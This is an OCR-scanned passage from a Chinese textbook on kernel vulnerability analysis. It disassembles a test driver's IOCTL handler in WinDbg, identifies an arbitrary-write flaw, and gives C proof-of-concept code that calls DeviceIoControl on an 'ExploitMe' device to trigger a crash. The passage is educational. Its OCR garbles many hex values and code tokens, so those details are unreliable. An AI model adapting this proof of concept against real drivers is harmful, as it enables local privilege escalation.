f9e324cθ
test+ex4ce
[ef]IRP_MO_INTERNAL_DEVICE_CONTROL
f90324ce
test+ex4ce
[10]  IRP_MO_SHUTDOWN
f90324ce
test+8x4ce
[11]IRP_MO_LOCK_CONTROL
f9e324ce
test+ex4ce
[12]IRP_MO_CLEANUP
f9e324ce
test+ex4ce
[13]IRP_MO_CREATE_MAILSLOT
f9e324ce
f90324ce
test+0x4ce
[14]  IRP_MO_QUERY_SECURITY
test+0x4ce
[15]IRP_MO_SET_SECURITY
f98324cθ
test+ex4ce
[16]IRP_MO_POWER
f90324cθ
test+ex4c@
[17] IRP_MO_SYSTEM_CONTROL
f90324cθ
test+ex4ce
[18]IRP_MO_DEVICE_CHANGE
f90324cθ
test+ex4ce
[19] IRP_HO_QUERY_QUOTA
f9e324cθ
test+ex4ce
[1a]IRP_HO_SET_QUOTA
f90324ce
test+8x4ce
[1b]  IRP_MO_PNP
884fb8a6
nt1IopInvalidDeviceRequest
上面的test+0x4c0就是IRP分发例程，通过对其反汇编，可以找到其中的IO控制码：
kd> uf test+ex4ce
test+ex4ce:
f90324ce 8bff
moV
edi,ed1
f90324c2 55
push
ebp
---
## Page 419
400
漏洞战争：软件漏洞分析精要
f9e324c3 8bec
mov
ebp,esp
f90324c5 83ec24
Sub
esp,24h
f9e324c8 c745e48e8eee80
mov
dword ptr [ebp-1ch],θ
f9e324cf 8b45ec
AOW
eax,dword ptr [ebp+ech]
f98324d2 8b486e
mov
ecx,dword ptr [eax+6eh]
f98324d5 894df4
mov
dword ptr [ebp-ech],ecx
f98324d8 8b55f4
mov
edx,dword ptr [ebp-eCh]
f98324db 8b421e
mov
eax,dword ptr [edx+1eh]
f98324de 8945f8
mov
dword ptr [ebp-8],eax
f90324e1 8b4dec
mov
ecx,dword ptr [ebp+ech]
f9e324e4 8b513c
mov
edx,dword ptr [ecx+3Ch]
f9e324e7 8955ec
mov
dword ptr [ebp-14h],edx
f9e324ea 8b45f4
mov
eax,dword ptr [ebp-eCh]
f9e324ed 8b4888
mov
ecx,dword ptr [eax+8]
f9e324fe 894dfc
mov
dword ptr [ebp-4],ecx
f9e324f3 8b55f4
mov
edx,dword ptr [ebp-0Ch]
f9e324f6 8b42e4
mov
eax,dword ptr [edx+4]
f98324f9 8945e8
mov
dword ptr [ebp-18h],eax
f9e324fc 8b4df4
mov
ecx,dword ptr [ebp-8Ch]
f9e324ff 8b51ec
AOB
edx,dword ptr [ecx+ech]
f9832582 8955fe
mov
dword ptr [ebp-1eh],edx
f98325e5 8b45ec
mov
eax,dword ptr [ebp+eCh]
f98325e8 83c018
add
eax, 18h
f9e325eb 8945ee
A0W
dword ptr [ebp-2eh],eax
f98325ee 8b4dee
AO8
ecx,dword ptr [ebp-2eh]
f9832511 c781e88888ee
mov
dword ptr [ecx],e
f9032517 8b55ee
AOW
edx, dword ptr [ebp-28h]
f9e3251a c7420400000000
mov
dword ptr [edx+4],e
f9e32521 8b45fe
mov
eax,dword ptr [ebp-1eh]
f9832524 8945dc
mov
dword ptr [ebp-24h],eax
f9832527 817ddc83a88888
cmp
dword ptr [ebp-24h],8888Aee3h
//10控制码
f9e3252e 7402
je
test+ex532 (f9032532)
//10控制码ex8888A8e3对应
的处理例程
kd> u f9032532
test+ex532:
f9032532 837dfce4
cmp
dword ptr [ebp-4],4
//输入缓冲区长度
f9e32536 721a
jb
test+ex552 (f9e32552)
f9e32538 837de884
cmp
dword ptr [ebp-18h],4
//输出缓冲区长度
f9e3253c 7214
b
test+ex552 (f9032552)
f9e3253e 8b4dec
mov
ecx,dword ptr [ebp-14h]
//用户可控的输出缓冲区
f9032541 8b55f8
mov
edx,dword ptr [ebp-8]
---
## Page 420
第9章内核漏洞分析
401
f9032544 8be2
moV
eax,dword ptr [edx]
//用户可控的输入缓冲区
f9032546 8901
moV
dword ptr [ecx],eax
//向任意地址写入任意数据，从而引
发本地内核提权漏洞
上面代码中的输入、输出缓冲区均是由ring3层代码指定，即用户可控的，这就导致可向任意地
址写入任意内容，最终实现内核提权。下面编写测试代码以触发崩溃，源码如下：
#include cwindows,h>
#include 
#include 
void ShowErrMsg()
LPVOID 1pMsgBuf;
DWORD d = GetLastError();
FormatMessage (
FORMAT_MESSAGE_ALLOCATE_BUFFER |
FORMAT_MESSAGE_FROM_SYSTEM,
NULL,
dn,
MAKELANGID( LANG_NEUTRAL,SUBLANG_DEFAULT),
(LPTSTR) &1pMsgBuf,
0, NULL );
printf(*系统错误：%s",1pMsgBuf);
LocalFree(1pMsgBuf);
上
int main(void)
HANDLE
hDevice;
DWORD
length = β;
BOOL
ret;
char
g_InputBuffer[4] ="\xee\xee\xee\xee°;
//输入缓冲区指针
//打开设备驱动
hDev1ce = CreateF11e(*\\1\. \\ExploitMe*,GENERIC_READ|GENERIC_wRITE,,e,OPEN_EXISTING,
FILE_ATTRIBUTE_SYSTEM,e);
1f (hDevice = INVALID_HANDLE_VALUE)
---
## Page 421
402漏洞战争：软件漏洞分析精要
{
ShowErrMsg();
return EXIT_FAILURE;
//利用漏润向地址8x888e8888写入数值ex88888880
ret = DeviceIoControl(hDevice,
//驱动句柄
@x8888A003,
//IoControlCode数值
g_InputBuffer,
//输入缓冲区指针
4,
//输入缓冲区字节数
‘88888888x9
//输出缓冲区指针
4,
//输出缓冲区字节数
&length,
//返回实际的数据字节数
NULL);
1f(1ret)
ShowErrMsg();
else
printf(*DeviceIoControl Success!\n*);
return EXIT_SUCCESS;
上
运行后系统崩溃，被WinDbg断下，下面是lanalyze-v的分析结果：
kd> 1analyze -v
**..........................
*
*
Bugcheck Analysis
PAGE_FAULT_IN_NONPAGED_AREA (50)
Invalid system memory was referenced.1
This cannot be protected by try-except,
It must be protected by a Probe.
Typically the address is just plain bad or it
is pointing at freed menory.
Arguments:
Arg1: 8e8esese, memory referenced.
Arg2: @eeeeee1, value 0 = read operation, 1 = write operatlon.
Arg3: f9e32546, If non-zero, the instruction address which referenced the bad memory
address.
Arg4: eeeeeeee, (reserved)
---
## Page 422
第9章内核漏洞分析403
Debugging Detai1s:
6******e
******
***
***
***
***
***
Your debugger is not using the correct symbols
***
***
***
***
In order for this command to work properly, your symbol.path
***
***
must point to -pdb files that have ful1 type information.
***
***
***
***
Certain .pdb f1les (such as the public 05 symbols) do not
***
***
contain the required information.  Contact the group that
***
***
provided you with these symbols if you need this command to
***
***
work.
***
***
***
***
Type referenced: kerne1321pN1sUserInfo
***
***
***
WRITE_ADDRESS:88808088
FAULTING_IP:
test+546
f9032546 8901